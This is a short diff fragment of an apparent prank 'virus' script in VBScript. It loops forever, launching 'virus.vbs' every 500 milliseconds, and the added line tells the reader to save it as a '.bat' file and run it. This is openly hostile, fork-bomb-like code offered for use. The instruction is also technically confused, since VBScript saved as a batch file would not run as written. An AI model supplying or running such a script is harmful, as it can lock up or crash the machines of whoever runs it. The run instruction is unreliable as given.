@@ -6,3 +6,5 @@ x.Run"virus.vbs"
 wscript.sleep 500
 next
 loop
+
+save it as in ".bat" extension and run it
